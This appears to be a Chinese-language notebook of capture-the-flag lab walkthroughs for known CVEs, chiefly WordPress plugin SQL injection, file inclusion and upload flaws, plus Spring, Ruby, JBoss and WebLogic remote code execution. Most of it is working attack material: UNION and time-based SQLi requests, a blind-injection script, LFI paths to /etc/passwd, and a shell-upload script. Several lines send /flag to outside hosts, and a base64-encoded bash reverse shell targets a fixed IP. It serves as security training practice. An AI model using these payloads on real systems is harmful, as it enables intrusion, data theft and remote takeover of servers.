curl 'http://eci-2ze173nkohbajx7g2j3c.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=WP_Contacts_Manager_call&type=get-contact' \
	--data '{"id":"1\u0027 UNION ALL SELECT 1,(SELECT version()),3,4,5,6,7,8,9,0,1,2; -- "}'

curl 'http://eci-2ze173nkohbajx7g2j3c.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=WP_Contacts_Manager_call&type=get-contact' \
	--data '{"id":"1\u0027 UNION ALL SELECT 1,(SELECT database()),3,4,5,6,7,8,9,0,1,2; -- "}'

```

![image-20230724090332782](%E9%9D%B6%E5%9C%BA.assets/image-20230724090332782.png)

```
http://eci-2ze173nkohbajx7g2j3c.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=WP_Contacts_Manager_call&type=get-contact

curl 'http://eci-2ze173nkohbajx7g2j3c.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=WP_Contacts_Manager_call&type=get-contact' \
        --data '{"id":"1\u0027 UNION ALL SELECT 1,(SELECT group_concat(column_name) from information_schema.columns where table_name=0x666c6167),3,4,5,6,7,8,9,0,1,2; -- "}'

curl 'http://eci-2zeer6gv9slti6shfojc.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=WP_Contacts_Manager_call&type=get-contact' \
        --data '{"id":"1\u0027 UNION ALL SELECT 1,(SELECT group_concat(flag) from flag),3,4,5,6,7,8,9,0,1,2; -- "}'
```



## CVE-2022-0948 WordPress plugin Order Listener for WooCommerce SQLI

*靶标介绍：*

WordPress plugin Order Listener for WooCommerce 3.2.2 之前版本存在SQL注入漏洞

https://wpscan.com/vulnerability/daad48df-6a25-493f-9d1d-17b897462576?__cf_chl_tk=pi6oKdw8GfQ_K7xHpfhiA8_ekHbirLuKkEIOb1.SIic-1690161524-0-gaNycGzNC6U

```
curl 'http://eci-2zeakzner7aecmyogy9a.cloudeci1.ichunqiu.com/?rest_route=/olistener/new' --data '{"id":" (SELECT SLEEP(3))#"}' -H 'content-type: application/json' 
```



```
POST /?rest_route=/olistener/new HTTP/1.1
Host: eci-2ze6nxpzgmh3qf19h8ly.cloudeci1.ichunqiu.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _ga=GA1.2.617032228.1689668529; _ga_J1DQF09WZC=GS1.2.1689668531.1.0.1689668531.0.0.0
Connection: close
Content-Type: application/json
Content-Length: 28

{"id":" (SELECT SLEEP(3))#"}
```

数据库名ctf



```
import requests
import time

def time_delay(url, headers, payload):
    start_time = time.time()
    response = requests.post(url, headers=headers, data=payload)
    end_time = time.time()
    #print(end_time,start_time)
    delay = end_time - start_time
    return delay

def time_based_blind_sql_injection(url, headers):
    result=[]
    for i in range(1, 100):
        for j in range(32,126):#r'0123456789abcdefghijklmnopqrstuvwxyz_-{}':
            #find db
            #payload = """{"id":" (if((substr(database(),%d,1))='%s',sleep(10),1))#"}""" % (i, j)
            #find table
            #payload = """{"id":" (if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=%d,sleep(10),1))#"}""" % (i, j)
            #find table -wp%
            payload = """{"id":" (if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() and table_name not like 0x777025),%d,1))=%d,sleep(10),1))#"}""" % (i, j)
            #find column
            #payload = """{"id":" (if(ascii(substr((select count(column_name) from information_schema.columns where table_name='flag'),%d,1))=%d,sleep(10),1))#"}""" % (i, j)
            payload = """{"id":" (if(ascii(substr((select flag from ctf.flag),%d,1))=%d,sleep(10),1))#"}""" % (i, j)
            delay = time_delay(url, headers, payload)
            print('{ ',''.join(result),' } ->',i,'-',j,"time_delay:",delay)
            if delay > 9:
                result.append(chr(j))
                print(''.join(result))
                break
    else:
        print("The payload is not vulnerable to SQL injection.")
    print('result:',''.join(result))

if __name__ == "__main__":
    url = "http://eci-2ze5qymq43f456ycvu8w.cloudeci1.ichunqiu.com/?rest_route=/olistener/new"
    headers = {
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cookie': '_ga=GA1.2.617032228.1689668529; _ga_J1DQF09WZC=GS1.2.1689668531.1.0.1689668531.0.0.0',
    'Connection': 'close',
    'Content-Type': 'application/json',
    }
    
    time_based_blind_sql_injection(url, headers)
```

![image-20230725105700549](%E9%9D%B6%E5%9C%BA.assets/image-20230725105700549.png)

## [待]CVE-2022-0788 wordpress插件 WP Fundraising Donation and Crowdfunding Platform < 1.5.0 SQLI

*靶标介绍：*

wordpress插件 WP Fundraising Donation and Crowdfunding Platform < 1.5.0 的其中一个REST路由在SQL语句使用时没有对参数进行过滤，导致SQL注入漏洞。

https://wpscan.com/vulnerability/fbc71710-123f-4c61-9796-a6a4fd354828

```
curl 'https://example.com/index.php?rest_route=/xs-donate-form/payment-redirect/3' \
    --data '{"id": "(SELECT 1 FROM (SELECT(SLEEP(5)))me)", "formid": "1", "type": "online_payment"}' \
    -X GET \
    -H 'Content-Type: application/json' 
-----------------------------------------------------------------------------------------------------
-X GET 表示使用 GET 方法发送请求。
(SELECT 1 FROM (SELECT(SLEEP(5)))me) 是一个 SQL 语句，它会从 me 表中查询一条记录，并在查询过程中休眠 5 秒。
-----------------------------------------------------------------------------------------------------
curl 'http://eci-2ze2s1s3xigrcey1vqhp.cloudeci1.ichunqiu.com/index.php?rest_route=/xs-donate-form/payment-redirect/3' \
    --data '{"id": "(SELECT 1 FROM (SELECT(SLEEP(5)))flag)", "formid": "1", "type": "online_payment"}' \
    -X GET \
    -H 'Content-Type: application/json'
    
http_proxy=localhost:8080 https_proxy=localhost:8080 curl 'http://eci-2ze2s1s3xigrcey1vqhp.cloudeci1.ichunqiu.com/index.php?rest_route=/xs-donate-form/payment-redirect/3' \
    --data '{"id": "(SELECT 1 FROM (SELECT(SLEEP(5)))flag)", "formid": "1", "type": "online_payment"}' \
    -X GET \
    -H 'Content-Type: application/json'
```

抓取的burp包

```
GET /index.php?rest_route=/xs-donate-form/payment-redirect/3 HTTP/1.1
Host: eci-2ze2s1s3xigrcey1vqhp.cloudeci1.ichunqiu.com
User-Agent: curl/7.84.0
Accept: */*
Content-Type: application/json
Content-Length: 89
Connection: close

{"id": "(SELECT 1 FROM (SELECT(SLEEP(5)))flag)", "formid": "1", "type": "online_payment"}
```







## CVE-2022-0784 wordpress插件 Title Experiments Free < 9.0.1 SQLI

*靶标介绍：*

wordpress插件 Title Experiments Free < 9.0.1 没有对用户输入进行过滤和转义，导致了SQL注入。

```
curl 'https://example.com/wp-admin/admin-ajax.php' --data 'action=wpex_titles&id[]=1 AND (SELECT 321 FROM (SELECT(SLEEP(5)))je)' 

使用sqlmap梭哈
sqlmap -u http://xxx.com/wp-admin/admin-ajax.php --data 'action=wpex_titles&id[]=1' --sql-shell
输入:
select flag from flag;
```

![image-20230725212042625](%E9%9D%B6%E5%9C%BA.assets/image-20230725212042625.png)

## CVE-2022-0410 WordPress plugin The WP Visitor Statistics SQLI

*靶标介绍：*

WordPress plugin The WP Visitor Statistics (Real Time Traffic) 5.6 之前存在SQL注入漏洞，该漏洞源于 refUrlDetails AJAX 不会清理和转义 id 参数。 登陆账户：user01/user01

https://wpscan.com/vulnerability/0d6b89f5-cf12-4ad4-831b-fed26763ba20

```
https://example.com/wp-admin/admin-ajax.php?action=refUrlDetails&id=sleep(1)%20--%20g 
```

```
GET /wp-admin/admin-ajax.php?action=refUrlDetails&id=1 HTTP/1.1
Host: eci-2ze5qymq43f4mgh3dbaz.cloudeci1.ichunqiu.com
Cookie: wordpress_5c016e8f0f95f039102cbe8366c5c7f3=user01%7C1690501937%7CWVcMOFInaiRpjBLPmR3aamwlHlMyZQ61vfGB6NfKfQx%7Ca93d571c961ac68b8337b83f9b76f0dd6fce0e0351fb1db6cb159a869594ca37; _ga=GA1.2.617032228.1689668529; _ga_J1DQF09WZC=GS1.2.1689668531.1.0.1689668531.0.0.0; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_5c016e8f0f95f039102cbe8366c5c7f3=user01%7C1690501937%7CWVcMOFInaiRpjBLPmR3aamwlHlMyZQ61vfGB6NfKfQx%7C5ad51d2169eba10c76ec7a6e7a88aa6cb95d8905a8e6e522cf99886133e8be32
Sec-Ch-Ua: "Chromium";v="113", "Not-A.Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

sqlmap -r 1.txt --sql-shell

select flag from flag;

![image-20230726080158663](%E9%9D%B6%E5%9C%BA.assets/image-20230726080158663.png)

## CVE-2021-24762 WordPress Plugin Perfect Survey 注入

*靶标介绍：*

WordPress Plugin Perfect Survey 注入

https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad

有回显

```
(The question_id must start with an existing post ID) https://example.com/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users 

/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users 
```

```
GET /wp-admin/admin-ajax.php?action=get_question&question_id=1 HTTP/1.1
Host: eci-2ze6nxpzgmh4o4h9rctr.cloudeci1.ichunqiu.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _ga=GA1.2.617032228.1689668529; _ga_J1DQF09WZC=GS1.2.1689668531.1.0.1689668531.0.0.0; wp-ps-session=8458qjbuf88k00cp79td3h66r3
Connection: close
```

sqlmap -r 1.txt --sql-shell

![image-20230726110718922](%E9%9D%B6%E5%9C%BA.assets/image-20230726110718922.png)

## CVE-2019-13275 WordPress Plugin wp-statics SQLI

*靶标介绍：*

WordPress VeronaLabs wp-statistics插件12.6.7之前版本中的v1/hit端点存在SQL注入漏洞。

https://wpscan.com/vulnerability/9412

```
time curl -X POST 'http://host/wp-json/wpstatistics/v1/hit' --data "wp_statistics_hit=x&wp_statistics_hit[track_all]=1&wp_statistics_hit[page_uri]=x&wp_statistics_hit[search_query]=x\' UNION ALL SELECT SLEEP(5)-- x" 

http_proxy=localhost:8080 https_proxy=localhost:8080 curl -X POST 'http://eci-2ze2s1s3xigrmvsyear5.cloudeci1.ichunqiu.com/wp-json/wpstatistics/v1/hit' --data "wp_statistics_hit=x&wp_statistics_hit[track_all]=1&wp_statistics_hit[page_uri]=x&wp_statistics_hit[search_query]=x\' UNION ALL SELECT SLEEP(5)-- x" 
```

指定注入点 方法同上注意下面的数据包格式

```
POST /wp-json/wpstatistics/v1/hit HTTP/1.1
Host: eci-2ze2s1s3xigrmvsyear5.cloudeci1.ichunqiu.com
User-Agent: curl/7.84.0
Accept: */*
Content-Length: 146
Content-Type: application/x-www-form-urlencoded
Connection: close

wp_statistics_hit=x&wp_statistics_hit[track_all]=1&wp_statistics_hit[page_uri]=x&wp_statistics_hit[search_query]=x'*
```

![image-20230726115214656](%E9%9D%B6%E5%9C%BA.assets/image-20230726115214656.png)





## CVE-2018-16283 WordPress Plugin Wechat Broadcast LFI

*靶标介绍：*

WordPress Plugin Wechat Broadcast LFI

```
# Exploit Title: WordPress Plugin Wechat Broadcast 1.2.0 - Local File Inclusion
# Author: Manuel Garcia Cardenas
# Date: 2018-09-19
# Software link: https://es.wordpress.org/plugins/wechat-broadcast/
# CVE: CVE-2018-16283

# Description
# This bug was found in the file: /wechat-broadcast/wechat/Image.php
# echo file_get_contents(isset($_GET["url"]) ? $_GET["url"] : '');
# The parameter "url" it is not sanitized allowing include local or remote files
# To exploit the vulnerability only is needed use the version 1.0 of the HTTP protocol 
# to interact with the application.

# PoC
# The following URL have been confirmed that is vulnerable to local and remote file inclusion.

GET /wordpress/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd

# Remote File Inclusion POC:

GET /wordpress/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=http://malicious.url/shell.txt
```

```
http://xxx.com/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=/../../../../../../flag
```

![image-20230726144734202](%E9%9D%B6%E5%9C%BA.assets/image-20230726144734202.png)



## CVE-2018-7422 WordPress Plugin Site Editor LFI

*靶标介绍：*

WordPress Plugin Site Editor LFI

https://github.com/jessisec/CVE-2018-7422/blob/main/CVE-2018-7422.py

```
/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/../../../../../flag
```

![image-20230726145131979](%E9%9D%B6%E5%9C%BA.assets/image-20230726145131979.png)



## CVE-2015-9331 wordpress插件 WordPress WP All Import plugin v3.2.3 任意文件上传

*靶标介绍：*

wordpress插件 WordPress WP All Import plugin v3.2.3 存在任意文件上传，可以上传shell。

https://moyu.life/wordpress-wp-all-import-cha-jian-lou-dong-fen-xi/

```
import requests,os
site=""
file_to_upload =''
up_req = requests.post('http://'+site+'/wp-admin/admin-ajax.php?page=pmxi-admin-settings&action=upload&name=evil.php',data=open(file_to_upload,'rb').read())
up_dir = os.popen('php -r "print md5(strtotime(\''+up_req.headers['date']+'\'));"').read()
print "http://"+site+"/wp-content/uploads/wpallimport/uploads/"+up_dir+"/%s" % （file_to_upload）
```

![image-20230727090313343](%E9%9D%B6%E5%9C%BA.assets/image-20230727090313343.png)





## CVE-2022-22947 Spring Cloud Gateway spel 远程代码执行

*靶标介绍：*

Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）发生在Spring Cloud Gateway应用程序的Actuator端点，其在启用、公开和不安全的情况下容易受到代码注入的攻击。攻击者可通过该漏洞恶意创建允许在远程主机上执行任意远程执行的请求。

/actuator/env

![image-20230712115100216](%E9%9D%B6%E5%9C%BA.assets/image-20230712115100216.png)

## CVE-2022-22965 Spring Framework JDK >= 9 远程代码执行漏洞

*靶标介绍：*

Spring framework 是Spring 里面的一个基础开源框架，其目的是用于简化 Java 企业级应用的开发难度和开发周期,2022年3月31日，VMware Tanzu发布漏洞报告，Spring Framework存在远程代码执行漏洞，在 JDK 9+ 上运行的 Spring MVC 或 Spring WebFlux 应用程序可能容易受到通过数据绑定的远程代码执行 (RCE) 的攻击。

https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/0c557e85ba903c7ad6f50c0306f6c8271736c35e/poc.py

![image-20230719114614207](%E9%9D%B6%E5%9C%BA.assets/image-20230719114614207.png)

![image-20230719114535958](%E9%9D%B6%E5%9C%BA.assets/image-20230719114535958.png)



## CVE-2022-22963 Spring Cloud Function functionRouter SPEL代码执行漏洞

*靶标介绍：*

SpringCloudFunction是SpringBoot开发的一个Servless中间件（FAAS），支持基于SpEL的函数式动态路由。当Spring Cloud Function 启用动态路由functionRouter时， HTTP请求头spring.cloud.function.routing-expression参数存在SPEL表达式注入漏洞，攻击者可通过该漏洞进行远程命令执行。 题目链接为：http://ip:port P.S 卡慢不影响拿flag

*收藏：*未收藏

```
curl -X POST  http://xxx:44046/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl -d @/flag xxx.xxx.com")' --data-raw 'data' -v
```

![image-20230719115331712](%E9%9D%B6%E5%9C%BA.assets/image-20230719115331712.png)

![image-20230719115416046](%E9%9D%B6%E5%9C%BA.assets/image-20230719115416046.png)



## CVE-2018-1273 Spring-data-commons 远程命令执行漏洞

*靶标介绍：*

Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。

https://github.com/jas502n/cve-2018-1273

![image-20230726151348788](%E9%9D%B6%E5%9C%BA.assets/image-20230726151348788.png)

```
POST /users?page=&size=5 HTTP/1.1
Host: eci-2zed98r1b0oimr7c2w7e.cloudeci1.ichunqiu.com:8080
Content-Length: 164
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://eci-2zed98r1b0oimr7c2w7e.cloudeci1.ichunqiu.com:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://eci-2zed98r1b0oimr7c2w7e.cloudeci1.ichunqiu.com:8080/users
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _ga=GA1.2.617032228.1689668529; _ga_J1DQF09WZC=GS1.2.1689668531.1.0.1689668531.0.0.0
Connection: close

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("curl -X POST --data @/flag http://omglx26k.requestrepo.com")]=&password=&repeatedPassword=
```

![image-20230726151420167](%E9%9D%B6%E5%9C%BA.assets/image-20230726151420167.png)

![image-20230726151449929](%E9%9D%B6%E5%9C%BA.assets/image-20230726151449929.png)

## CVE-2019-16113 Bludit目录穿越漏洞

*靶标介绍：*

在Bludit<=3.9.2的版本中，攻击者可以通过定制uuid值将文件上传到指定的路径，然后通过bl-kernel/ajax/upload-images.php远程执行任意代码。

https://github.com/Kenun99/CVE-2019-16113-Dockerfile

![image-20230726152636370](%E9%9D%B6%E5%9C%BA.assets/image-20230726152636370.png)

![image-20230726152506954](%E9%9D%B6%E5%9C%BA.assets/image-20230726152506954.png)

![image-20230726152528373](%E9%9D%B6%E5%9C%BA.assets/image-20230726152528373.png)

## CVE-2019-12422 Shiro < 1.4.2 cookie oracle padding漏洞

*靶标介绍：*

Apache Shiro是美国阿帕奇（Apache）软件基金会的一套用于执行认证、授权、加密和会话管理的Java安全框架。 Apache Shiro 1.4.2之前版本中存在安全漏洞。当Apache Shiro使用了默认的‘记住我’配置时，攻击者可利用该漏洞对cookies实施填充攻击。

https://www.cnblogs.com/qianxinggz/p/13388405.html

https://github.com/fupinglee/JavaTools

![image-20230727084248722](%E9%9D%B6%E5%9C%BA.assets/image-20230727084248722.png)









## CVE-2020-25540 Thinkadmin v6任意文件读取漏洞

*靶标介绍：*

ThinkAdmin 6版本存在路径遍历漏洞，可利用该漏洞通过GET请求编码参数任意读取远程服务器上的文件.

```
<?php function encode($content){list($chars, $length) = ['', strlen($string = iconv('UTF-8', 'GBK//TRANSLIT', $content))];for ($i = 0; $i < $length; $i++) $chars .= str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0);return $chars;}$content="/../../../../../../flag";echo encode($content);?>
```

![image-20230726164007845](%E9%9D%B6%E5%9C%BA.assets/image-20230726164007845.png)



payload

```
http://xxx.com/admin.html?s=admin/api.Update/get/encode/1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2u302p2v
```

![image-20230726164049034](%E9%9D%B6%E5%9C%BA.assets/image-20230726164049034.png)

![image-20230726164136705](%E9%9D%B6%E5%9C%BA.assets/image-20230726164136705.png)



## [待]CVE-2017-17405 Ruby Net::FTP 模块命令注入漏洞

*靶标介绍：*

2.4.3之前的Ruby允许Net :: FTP命令注入。

我们访问 http://your-ip:8080/download?uri=ftp://example.com:2121/&file=vulhub.txt，它会从 example.com:2121 这个 ftp 服务端下载文件 vulhub.txt 到本地，并将内容返回给用户。

/download?uri=ftp://103.231.14.158:2121/&file=|bash${IFS}-c${IFS}'{echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAzLjIzMS4xNC4xNTgvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}'

反弹shell
构造执行反弹shell的命令
linux反弹shell的命令bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/6666 0>&1
|bash${IFS}-c${IFS}'{echo,YmFzaCAtaSA...}|{base64,-d}|{bash,-i}'
其中的base64编码中的加号+要替换成%2B，否则浏览器会把+编码成空格，使得命令解码出错



## CVE-2017-12149 JBoss反序列化漏洞

*靶标介绍：*

2017年8月30日，厂商Redhat发布了一个JBOSSAS 5.x 的反序列化远程代码执行漏洞通告。该漏洞位于JBoss的HttpInvoker组件中的 ReadOnlyAccessFilter 过滤器中，其doFilter方法在没有进行任何安全检查和限制的情况下尝试将来自客户端的序列化数据流进行反序列化，导致攻击者可以通过精心设计的序列化数据来执行任意代码。但近期有安全研究者发现JBOSSAS 6.x也受该漏洞影响，攻击者利用该漏洞无需用户验证在系统上执行任意命令，获得服务器的控制权。

*收藏：*未收藏

https://github.com/1337g/CVE-2017-12149/blob/master/CVE-2017-12149.py

不行

https://gitee.com/abcall/jboss-_CVE-2017-12149

https://github.com/fupinglee/JavaTools

![image-20230727083335274](%E9%9D%B6%E5%9C%BA.assets/image-20230727083335274.png)

![image-20230727083410371](%E9%9D%B6%E5%9C%BA.assets/image-20230727083410371.png)



## [待]CVE-2021-25928

*靶标介绍：*

‘safe-obj’ 版本 1.0.0 到 1.0.2 中的原型污染漏洞允许攻击者导致拒绝服务并可能导致远程代码执行。

https://blog.csdn.net/m0_64348326/article/details/130632693



```
http://userb1ank.xyz/2023/02/03/javascript/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91real_ez_node%E5%A4%8D%E7%8E%B0/
```

```
import requests

payload = """ HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive

POST /file_upload HTTP/1.1
Host: 127.0.0.1
Content-Length: {}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt

{}""".replace('\n', '\r\n')

body = """------WebKitFormBoundarysAs7bV3fMHq0JXUt
Content-Disposition: form-data; name="file"; filename="lmonstergg.pug"
Content-Type: ../template

-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()")
-return x
------WebKitFormBoundarysAs7bV3fMHq0JXUt--

""".replace('\n', '\r\n')

payload = payload.format(len(body), body) \
    .replace('+', '\u012b')             \
    .replace(' ', '\u0120')             \
    .replace('\r\n', '\u010d\u010a')    \
    .replace('"', '\u0122')             \
    .replace("'", '\u0a27')             \
    .replace('[', '\u015b')             \
    .replace(']', '\u015d') \
    + 'GET' + '\u0120' + '/'

session = requests.Session()
session.trust_env = False
response1 = session.get('http://eci-2ze3onaghqi17oldad3m.cloudeci1.ichunqiu.com:3000/core?q=' + payload)
response = session.get('http://eci-2ze3onaghqi17oldad3m.cloudeci1.ichunqiu.com:3000/?action=lmonstergg')
print(response.text)

```

## [待]CVE-2020-2883 Weblogic Server T3 协议远程名称执行漏洞

*靶标介绍：*

在Oracle官方发布的2020年4月关键补丁公告中，两个针对WebLogic Server的严重漏洞（CVE-2020-2883和CVE-2020-2884），允许未经身份验证的攻击者通过T3协议网络访问并破坏易受攻击的Weblogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而导致远程代码被执行。

工具地址

https://github.com/sp4zcmd/WeblogicExploit-GUI/releases/tag/WeblogicExploit-GUI

不好用

https://github.com/KimJun1010/WeblogicTool



## CVE-2018-2894 Weblogic 任意文件上传漏洞

*靶标介绍：*

Oracle Fusion Middleware 的 Oracle WebLogic Server 组件中的漏洞（子组件：WLS - Web Services）。受影响的受支持版本包括 12.1.3.0、12.2.1.2 和 12.2.1.3。易于利用的漏洞允许未经身份验证的攻击者通过HTTP进行网络访问，从而破坏Oracle WebLogic Server。成功攻击此漏洞可导致 Oracle WebLogic Server 被接管。

![image-20230728110822848](%E9%9D%B6%E5%9C%BA.assets/image-20230728110822848.png)

![image-20230728110843896](%E9%9D%B6%E5%9C%BA.assets/image-20230728110843896.png)

## CVE-2018-3191 Weblogic WLS Core Components 反序列化命令执行漏洞

*靶标介绍：*

Oracle Fusion Middleware 的 Oracle WebLogic Server 组件中的漏洞（子组件：WLS Core Components）。受影响的受支持版本包括 10.3.6.0、12.1.3.0 和 12.2.1.3。易于利用的漏洞允许未经身份验证的攻击者通过 T3 进行网络访问，从而破坏 Oracle WebLogic Server。成功攻击此漏洞可导致 Oracle WebLogic Server 被接管。

![image-20230728111230811](%E9%9D%B6%E5%9C%BA.assets/image-20230728111230811.png)

![image-20230728111309934](%E9%9D%B6%E5%9C%BA.assets/image-20230728111309934.png)

## [待]CVE-2020-2551 Weblogic iiop协议 反序列化

*靶标介绍：*

2020年1月15日,Oracle发布了一系列的安全补丁,其中Oracle WebLogic Server产品有高危漏洞,漏洞编号CVE-2020-2551,CVSS评分9.8分,漏洞利用难度低,可基于IIOP协议执行远程代码。

## [待]CVE-2020-14825 Weblogic LockVersionExtractor T3 反序列化漏洞

*靶标介绍：*

Oracle官方在2020年10月份发布的最新安全补丁中修复了许多安全漏洞，其中黑名单类oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor可造成反序列化漏洞。该漏洞允许未经身份验证的攻击者通过IIOP，T3进行网络访问，未经身份验证的攻击者成功利用此漏洞可能接管Oracle Weblogic Server。









